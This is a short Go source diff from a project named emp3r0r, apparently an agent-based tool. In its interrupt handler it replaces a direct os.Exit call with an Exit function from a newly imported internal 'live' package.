@@ -18,6 +18,7 @@ import (
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/preflight"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -86,7 +87,7 @@ func catchInterruptAndExit(ctx context.Context, cancel context.CancelFunc) {
 	case <-sig:
 		logging.Infof("Cancelling due to interrupt")
 		cancel()
-		os.Exit(0)
+		live.Exit(0)
 	case <-ctx.Done():
 		signal.Stop(sig)
 		return
